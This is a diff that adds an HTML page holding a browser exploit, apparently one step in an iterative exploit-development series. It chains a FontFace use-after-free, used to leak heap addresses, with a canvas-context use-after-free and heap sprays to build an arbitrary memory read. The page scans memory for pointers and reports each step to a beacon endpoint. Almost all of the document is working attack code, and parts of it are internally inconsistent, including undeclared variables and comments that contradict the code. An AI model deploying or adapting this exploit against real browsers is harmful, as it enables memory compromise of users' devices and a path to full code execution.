@@ -1,0 +1,350 @@
+<!--
+  p570h: post-GC inline forge (768B ctx slot) = crash-free arbitrary read + stateStack buffer reclaim (retention FIXED) = arbitrary read
+
+  v1 (p570e) verdict: 13/13 hard crashes at first inner.getLineDash() after
+  AB(768) spray. The freed context slot is contended by engine allocations
+  between the free (inside getContext) and any post-return spray -> garbage
+  at +0x138/+0x144 -> memcpy fault. Post-hoc AB(768) cannot win that race.
+
+  Proven mechanism to build on instead (p553/p570d, this console):
+    - same-type context spray DOES win the race -> stale inner aliases a
+      live sprayed context (BIDIR-1, textAlign sentinel round-trip OK)
+    - alias.save()x8 + lineWidth realize the out-of-line 7424B stateStack
+  p570d's only failure: its AB(7424) reclaim missed because __retained kept
+  the alias context alive forever (retention bug).
+
+  v2 (this probe):
+    2a-2e  p570d steps VERBATIM (desynchronized getter, 80-ctx spray,
+           textAlign sentinel, setLineDash alias identification, realize)
+    FIX-1  alias NOT retained: canvas removed from DOM, sprayCtx[idx]=null,
+           no __retained entry
+    FIX-2  GC pressure = proven pattern (300 x 64KB per round x 6 rounds)
+    FIX-3  reads through stale: getLineDash ONLY (single-hop; lineWidth is
+           two-hop = p648d2 death)
+           -> after AB(7424) spray:
+              len 64  = HIT (State[8] is ours)  -> repeating 512B read
+              len 0   = context slot zeroed by other allocs (SAFE miss,
+                        retry next attempt)
+              len 9   = buffer reclaim missed; stale A states (report only)
+    NO AB(768) spray: a freed 768B slot keeps stale m_buffer/m_size at
+    +0x70/+0x7C (bmalloc freelist metadata only touches the first qwords),
+    which is exactly what the single-hop read needs if our AB(7424) caught
+    the buffer.
+
+  State[8] in the 7424B buffer: base 3712, lineDash.ptr +184 = 3896,
+  cap +192 = 3904, size +196 = 3908. size=64 -> 512B per getLineDash.
+  Scan after HIT: R0 = T1 zone dump, then T1 -32KB..+32KB, W +-4KB,
+  band classifier (heap=hi32 0x10 / tiny / cand32 / cand64), TOPCANDS.
+
+  Beacon: P570H-.
+  CRASH_CLASS: MODERATE-HIGH.
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p570f buffer reclaim read</title>
+<script>
+function b(m) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon/' + encodeURIComponent(m) + '?t=' + Date.now(), false);
+    x.send(null);
+  } catch (e) {}
+}
+function hex8(arr, off) {
+  var s = '';
+  for (var i = 0; i < 8; i++) { var v = arr[off + i]; s += (v < 16 ? '0' : '') + v.toString(16); }
+  return s;
+}
+function u32(arr, off) { return (arr[off] | (arr[off+1]<<8) | (arr[off+2]<<16) | (arr[off+3]<<24)) >>> 0; }
+
+/* ============ PHASE 1: FontFace UAF leak (verbatim p570d) ============ */
+var leaked58 = null, leaked68 = null, phase1Done = false;
+
+function phase1() {
+  b('P570H-PH1-START');
+  var styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  var A = new FontFace('f0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  window.__fontAlive = [A];
+
+  var firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function () {
+      if (firedHere) return undefined;
+      firedHere = true;
+      b('P570H-PH1-TRAP');
+      styleEl.remove();
+      styleEl.textContent = '';
+      styleEl = null;
+      try { document.fonts.delete(this); } catch (e) {}
+      document.body.offsetHeight;
+      window.__abmap = [];
+      /* concentrated 192B spray FIRST (p654b/p655 pattern: 72 slots), then dilute matrix */
+      for (var k = 0; k < 72; k++) {
+        var ab1 = new ArrayBuffer(192);
+        window.__abmap.push({ size: 192, view: new Uint8Array(ab1) });
+      }
+      var SIZES = [64, 96, 128, 160, 192, 224, 256, 320, 384, 512, 768, 1024, 2048];
+      for (var si = 0; si < SIZES.length; si++) {
+        for (var k = 0; k < 8; k++) {
+          var ab = new ArrayBuffer(SIZES[si]);
+          window.__abmap.push({ size: SIZES[si], view: new Uint8Array(ab) });
+        }
+      }
+      try { document.fonts.check('1em s0'); } catch (e) {}
+      return undefined;
+    },
+    set: function () {}
+  });
+
+  b('P570H-PH1-LOAD');
+  document.fonts.load('1em f0, s0', 'AB').then(
+    function () { b('P570H-PH1-RESOLVED'); },
+    function () { b('P570H-PH1-REJECTED'); }
+  );
+  setTimeout(scanPhase1, 60);
+  setTimeout(scanPhase1, 400);
+  setTimeout(function () {
+    if (!phase1Done) {
+      var nz = -1;
+      if (window.__abmap) {
+        nz = 0;
+        for (var i = 0; i < __abmap.length; i++) {
+          if (__abmap[i].size !== 192) continue;
+          for (var j = 0; j < __abmap[i].view.length; j++) if (__abmap[i].view[j] !== 0) { nz++; break; }
+        }
+      }
+      b('P570H-PH1-TIMEOUT-trap=' + firedHere + '-nz192=' + nz);
+    }
+  }, 2000);
+}
+
+function scanPhase1() {
+  if (phase1Done) return;
+  var m = window.__abmap;
+  if (!m || !m.length) return;
+  for (var i = 0; i < m.length; i++) {
+    var v = m[i].view, nz = 0;
+    for (var j = 0; j < v.length; j++) if (v[j] !== 0) nz++;
+    if (nz > 0 && m[i].size === 192) {
+      leaked58 = []; leaked68 = [];
+      for (var q = 0; q < 8; q++) { leaked58.push(v[0x58 + q]); leaked68.push(v[0x68 + q]); }
+      phase1Done = true;
+      b('P570H-PH1-HIT-b' + i + '-p58=' + hex8(v, 0x58) + '-p68=' + hex8(v, 0x68));
+      setTimeout(phase2, 100);
+      return;
+    }
+  }
+  for (var i = 0; i < m.length; i++) {
+    var v = m[i].view, nz = 0;
+    for (var j = 0; j < v.length; j++) if (v[j] !== 0) nz++;
+    if (nz > 0) { phase1Done = true; b('P570H-PH1-WRONGSIZE-b' + i + '-s' + m[i].size); return; }
+  }
+}
+
+/* ============ PHASE 2: alias + buffer reclaim + read ============ */
+function addrBytes(hi, lo) {
+  return [lo&255,(lo>>>8)&255,(lo>>>16)&255,(lo>>>24)&255,hi&255,(hi>>>8)&255,(hi>>>16)&255,(hi>>>24)&255];
+}
+var cvBuf = new ArrayBuffer(512), cvF64 = new Float64Array(cvBuf), cvU8 = new Uint8Array(cvBuf);
+
+function classifyRound(ld) {
+  for (var i = 0; i < 64; i++) cvF64[i] = ld[i];
+  var heap = 0, tiny = 0;
+  var cands = [];
+  for (var q = 0; q < 64; q++) {
+    var lo = u32(cvU8, q*8), hi = u32(cvU8, q*8+4);
+    if (hi === 0x10) heap++;
+    else if (hi === 0 && lo < 0x100000) tiny++;
+    else if (hi === 0 && lo >= 0x400000) cands.push({t:'c32', hi:hi, lo:lo});
+    else if (hi !== 0) cands.push({t:'c64', hi:hi, lo:lo});
+  }
+  return { heap: heap, tiny: tiny, cands: cands, u8: cvU8 };
+}
+function candKey(c) {
+  var h = c.hi.toString(16), l = ('00000000' + c.lo.toString(16)).slice(-8);
+  return h + '_' + l;
+}
+
+var BUF = 7424, ST8 = 3712, PTR_OFF = ST8 + 184, CAP_OFF = ST8 + 192, SIZE_OFF = ST8 + 196;
+
+function phase2() {
+  if (!leaked58) { b('P570H-PH2-NOLEAK'); return; }
+  var T_lo = u32(leaked58, 0), T_hi = u32(leaked58, 4);
+  var W_lo = u32(leaked68, 0), W_hi = u32(leaked68, 4);
+  var Tbase = T_hi * 4294967296 + T_lo;
+  var Wbase = W_hi * 4294967296 + W_lo;
+  b('P570H-PH2-T=' + T_hi.toString(16) + ('00000000'+T_lo.toString(16)).slice(-8) +
+    '-W=' + W_hi.toString(16) + ('00000000'+W_lo.toString(16)).slice(-8));
+
+  /* ---- 2a: canvas UAF via desynchronized getter (proven) ---- */
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  document.body.appendChild(canvas);
+  var inner = null, getterFired = 0;
+  var opts = {};
+  Object.defineProperty(opts, 'desynchronized', {
+    get: function () { getterFired++; if (getterFired === 1) inner = canvas.getContext('2d'); return false; },
+    enumerable: true
+  });
+  var outer = null;
+  try { outer = canvas.getContext('2d', opts); } catch (e) { b('P570H-CTX-ERR-' + e.message); return; }
+  if (outer === inner || !inner) { b('P570H-PATCHED-g' + getterFired); return; }
+  b('P570H-UAF-OK-g' + getterFired);
+  window.__keep = [canvas, outer];      /* inner NOT retained anywhere */
+
+  /* ---- 2b: same-type spray (proven race winner) ---- */
+  var SPRAY = 80, SENTINEL = 'center';
+  var sprayCtx = [], sprayCanvases = [];
+  for (var i = 0; i < SPRAY; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    document.body.appendChild(c);
+    var ctx = c.getContext('2d');
+    if (ctx) { ctx.textAlign = SENTINEL; sprayCtx.push(ctx); sprayCanvases.push(c); }
+  }
+  b('P570H-SPRAY-n=' + sprayCtx.length);
+
+  /* ---- 2c: verify channel via textAlign (proven read) ---- */
+  var ta;
+  try { ta = inner.textAlign; } catch (e) { ta = 'ERR'; }
+  if (ta !== SENTINEL) { b('P570H-NORECLAIM-ta=' + ta); return; }
+  b('P570H-RECLAIM-OK');
+
+  /* ---- 2d: identify alias via setLineDash (proven) ---- */
+  try { inner.setLineDash([7.25, 3.5]); } catch (e) { b('P570H-SETDASH-ERR'); return; }
+  var aliasIdx = -1;
+  for (var j = 0; j < sprayCtx.length; j++) {
+    try {
+      var ld = sprayCtx[j].getLineDash();
+      if (ld && ld.length === 2 && Math.abs(ld[0] - 7.25) < 0.01) { aliasIdx = j; break; }
+    } catch (e) {}
+  }
+  if (aliasIdx < 0) { b('P570H-NOALIAS'); return; }
+  b('P570H-BIDIR-1-idx=' + aliasIdx);
+  try { inner.setLineDash([]); } catch (e) {}
+
+  /* ---- (2e REMOVED: no realize. Post-GC the slot zeroes -> inline base state.
+     p570g bench evidence: PROBE-LEN=0 post-GC = stable, zeroed, race-free.
+     Inline base state lineDash lives INSIDE the 768B ctx slot:
+     ptr +0x138, cap +0x140, size +0x144 (p648 series proven offsets).
+     AB(768) taking the slot owns the whole reader.) ---- */
+
+  /* ---- FIX-1: drop EVERY reference to the alias context ---- */
+  sprayCtx[aliasIdx] = null;
+  alias = null;
+  try { if (aliasCanvas.parentNode) aliasCanvas.parentNode.removeChild(aliasCanvas); } catch (e) {}
+  aliasCanvas = null;
+  sprayCanvases[aliasIdx] = null;
+  b('P570H-REFS-DROPPED');
+
+  /* ---- FIX-2: proven GC pressure, async rounds ---- */
+  var round = 0;
+  (function gcRound() {
+    round++;
+    var g = [];
+    for (var k = 0; k < 300; k++) g.push(new ArrayBuffer(65536));
+    g = null;
+    if (round < 6) { setTimeout(gcRound, 30); return; }
+    b('P570H-GC-DONE-r' + round);
+    afterGC();
+  })();
+
+  function afterGC() {
+    /* ---- AB(768) INLINE FORGE: take the zeroed ctx slot itself ---- */
+    var LD_PTR = 0x138, LD_CAP = 0x140, LD_SIZE = 0x144;
+    var pb = addrBytes(T_hi, T_lo);
+    var abs = [];
+    for (var a = 0; a < 128; a++) {
+      var ab = new ArrayBuffer(768);
+      var u8 = new Uint8Array(ab);
+      for (var k = 0; k < 8; k++) u8[LD_PTR + k] = pb[k];
+      u8[LD_CAP] = 64; u8[LD_SIZE] = 64;
+      abs.push(u8);
+    }
+    b('P570H-AB-SPRAY-128');
+
+    /* ---- single-hop probe ---- */
+    var ld0;
+    try { ld0 = inner.getLineDash(); } catch (e) { b('P570H-PROBE-FAULT'); return; }
+    if (!Array.isArray(ld0)) { b('P570H-PROBE-BAD=' + ld0); return; }
+    b('P570H-PROBE-LEN=' + ld0.length);
+
+    if (ld0.length !== 64) {
+      /* len 0: slot still zeroed (AB missed it); stop safely. */
+      b('P570H-MISS-len' + ld0.length);
+      return;
+    }
+
+    /* ---- HIT: repeating arbitrary read + vtable scan ---- */
+    b('P570H-HIT-READER-ARMED');
+    var candCounts = {}, rounds = 0, dumps = 0;
+
+    function readAt(addr) {
+      var lo = (addr % 4294967296) >>> 0;
+      var hi = ((addr - lo) / 4294967296) >>> 0;
+      var pb2 = addrBytes(hi, lo);
+      for (var i = 0; i < abs.length; i++) {
+        var u8 = abs[i];
+        for (var k = 0; k < 8; k++) u8[0x138 + k] = pb2[k];
+      }
+      var ld;
+      try { ld = inner.getLineDash(); } catch (e) { return null; }
+      if (!Array.isArray(ld) || ld.length !== 64) return { miss: true };
+      return classifyRound(ld);
+    }
+
+    function handle(name, res, wantFull) {
+      rounds++;
+      if (res === null) { b('P570H-R-' + name + '-FAULT'); return false; }
+      if (res.miss) { b('P570H-R-' + name + '-LENLOSS'); return false; }
+      var c = res.cands;
+      for (var i = 0; i < c.length; i++) {
+        var k = candKey(c[i]);
+        candCounts[k] = (candCounts[k] || 0) + 1;
+      }
+      if (c.length || wantFull) {
+        b('P570H-R-' + name + '-heap' + res.heap + '-tiny' + res.tiny + '-c' + c.length);
+        if ((c.length && dumps < 10) || wantFull) {
+          dumps++;
+          var out = [];
+          for (var i = 0; i < Math.min(c.length, 10); i++) out.push(candKey(c[i]));
+          b('P570H-D-' + name + '-CANDS=' + out.join(','));
+          var hx = '';
+          for (var d = 0; d < 4; d++) hx += hex8(res.u8, d*8) + ' ';
+          b('P570H-D-' + name + '-HEAD=' + hx);
+        }
+      } else if (rounds % 16 === 1) {
+        b('P570H-R-' + name + '-heap' + res.heap + '-tiny' + res.tiny + '-c0');
+      }
+      return true;
+    }
+
+    handle('T0', readAt(Tbase), true);
+    for (var k = -64; k <= 64; k++) {
+      if (k === 0) continue;
+      handle('T' + (k < 0 ? 'm' : 'p') + Math.abs(k), readAt(Tbase + k * 512), false);
+    }
+    handle('W0', readAt(Wbase), true);
+    for (var k = -8; k <= 8; k++) {
+      if (k === 0) continue;
+      handle('W' + (k < 0 ? 'm' : 'p') + Math.abs(k), readAt(Wbase + k * 512), false);
+    }
+
+    var arr = [];
+    for (var k in candCounts) arr.push([k, candCounts[k]]);
+    arr.sort(function (a, b2) { return b2[1] - a[1]; });
+    var ts = '';
+    for (var i = 0; i < Math.min(6, arr.length); i++) ts += arr[i][0] + 'x' + arr[i][1] + ' ';
+    b('P570H-TOPCANDS=' + ts);
+    b('P570H-DONE-rounds=' + rounds + '-cands=' + arr.length);
+    b('P570H-ALIVE');
+  }
+}
+
+function run() { b('P570H-BOOT'); phase1(); }
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script></head><body><p>p570f buffer reclaim read</p></body></html>
